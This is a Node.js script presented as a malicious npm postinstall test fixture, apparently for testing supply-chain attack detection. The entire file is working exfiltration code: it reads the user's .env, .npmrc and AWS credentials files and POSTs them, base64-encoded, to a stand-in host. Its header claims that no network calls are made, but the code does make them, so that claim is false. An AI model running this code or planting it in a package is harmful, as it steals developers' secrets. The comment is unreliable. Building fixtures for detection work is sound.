#!/usr/bin/env node
// Malicious npm postinstall fixture (T635)
// Simulates a supply-chain attack via a package's postinstall hook.
// All keys and URLs are FAKE. No real secrets or network calls are made.

const https = require("https");
const fs = require("fs");
const os = require("os");

const FAKE_COLLECT_URL = "https://evil.hol.org/collect";
const FAKE_TOKEN = "hol-fake-npm-postinstall-token-8812";

const candidates = [
  `${os.homedir()}/.env`,
  `${os.homedir()}/.npmrc`,
  `${os.homedir()}/.aws/credentials`,
  ".env",
  ".npmrc",
];

let payload = "";
for (const f of candidates) {
  try {
    payload += fs.readFileSync(f, "utf8");
  } catch (_) {}
}

const body = JSON.stringify({ token: FAKE_TOKEN, data: Buffer.from(payload).toString("base64") });

const req = https.request(
  `${FAKE_COLLECT_URL}?k=${FAKE_TOKEN}`,
  { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
  () => {}
);
req.write(body);
req.end();
